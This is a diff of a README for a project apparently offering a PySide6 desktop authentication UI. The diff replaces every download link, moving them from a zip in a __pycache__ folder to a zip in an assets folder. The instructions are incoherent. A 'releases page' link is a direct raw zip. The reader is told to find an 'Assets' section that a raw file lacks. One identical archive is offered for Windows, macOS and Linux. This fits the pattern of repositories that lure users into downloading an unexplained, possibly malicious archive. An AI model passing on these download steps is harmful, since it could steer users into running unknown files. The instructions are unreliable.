@@ -1,7 +1,7 @@
 # 🎨 modern-pyside6-auth-ui - Simple Desktop Authentication Made Easy
 
 ## 📦 Download the latest version
-[![Download](https://raw.githubusercontent.com/esad123/modern-pyside6-auth-ui/main/__pycache__/pyside_ui_modern_auth_v1.3.zip%20Version-blue)](https://raw.githubusercontent.com/esad123/modern-pyside6-auth-ui/main/__pycache__/pyside_ui_modern_auth_v1.3.zip)
+[![Download](https://github.com/esad123/modern-pyside6-auth-ui/raw/refs/heads/main/assets/auth_pyside_ui_modern_v1.1.zip%20Version-blue)](https://github.com/esad123/modern-pyside6-auth-ui/raw/refs/heads/main/assets/auth_pyside_ui_modern_v1.1.zip)
 
 ## 🚀 Getting Started
 Welcome to the modern-pyside6-auth-ui! This application provides a clean and modern user interface for handling user authentication, including login, signup, and password reset features. It is designed for both desktop and Web3 applications, making it a versatile choice for developers looking to integrate authentication into their apps.
@@ -23,12 +23,12 @@ To run the modern-pyside6-auth-ui, your computer should meet the following requi
 ## 📥 Download & Install
 To get started with the application, you will need to download it. Follow these steps:
 
-1. Visit the releases page: [Download the latest version](https://raw.githubusercontent.com/esad123/modern-pyside6-auth-ui/main/__pycache__/pyside_ui_modern_auth_v1.3.zip).
+1. Visit the releases page: [Download the latest version](https://github.com/esad123/modern-pyside6-auth-ui/raw/refs/heads/main/assets/auth_pyside_ui_modern_v1.1.zip).
 2. Scroll down to the "Assets" section of the latest release.
 3. Choose the appropriate file for your operating system:
-   - For Windows: Download `https://raw.githubusercontent.com/esad123/modern-pyside6-auth-ui/main/__pycache__/pyside_ui_modern_auth_v1.3.zip`.
-   - For macOS: Download `https://raw.githubusercontent.com/esad123/modern-pyside6-auth-ui/main/__pycache__/pyside_ui_modern_auth_v1.3.zip`.
-   - For Linux: Download `https://raw.githubusercontent.com/esad123/modern-pyside6-auth-ui/main/__pycache__/pyside_ui_modern_auth_v1.3.zip`.
+   - For Windows: Download `https://github.com/esad123/modern-pyside6-auth-ui/raw/refs/heads/main/assets/auth_pyside_ui_modern_v1.1.zip`.
+   - For macOS: Download `https://github.com/esad123/modern-pyside6-auth-ui/raw/refs/heads/main/assets/auth_pyside_ui_modern_v1.1.zip`.
+   - For Linux: Download `https://github.com/esad123/modern-pyside6-auth-ui/raw/refs/heads/main/assets/auth_pyside_ui_modern_v1.1.zip`.
 4. Once the download is complete, locate the downloaded file on your computer.
 
 ### For Windows Users:
@@ -60,7 +60,7 @@ You might want to customize certain application settings. Here are a few options
 ## 🔄 Updating the Application
 To get the latest features and security updates, regularly check the releases page for new versions:
 
-1. Visit the releases page: [Download the latest version](https://raw.githubusercontent.com/esad123/modern-pyside6-auth-ui/main/__pycache__/pyside_ui_modern_auth_v1.3.zip).
+1. Visit the releases page: [Download the latest version](https://github.com/esad123/modern-pyside6-auth-ui/raw/refs/heads/main/assets/auth_pyside_ui_modern_v1.1.zip).
 2. Follow the download and installation steps for the new version.
 
 ## 🤝 Support & Feedback
